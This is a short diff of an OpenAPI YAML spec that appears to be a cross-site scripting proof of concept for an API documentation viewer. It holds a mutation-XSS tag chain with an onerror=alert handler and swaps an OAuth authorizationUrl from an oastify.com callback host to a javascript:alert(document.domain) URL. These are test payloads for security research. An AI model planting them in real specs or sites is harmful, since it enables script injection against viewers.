@@ -8,7 +8,7 @@ components:
         <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
       flows:
         implicit:   # <---- OAuth flow(authorizationCode, implicit, password or clientCredentials)
-          authorizationUrl: http://hdy9f6co4267ouopbsao3br2ltrkfa3z.oastify.com/javascript:alert(document.domain)
+          authorizationUrl: javascript:alert(document.domain)//
           scopes:
             read_pets: read your pets
             write_pets: modify pets in your account
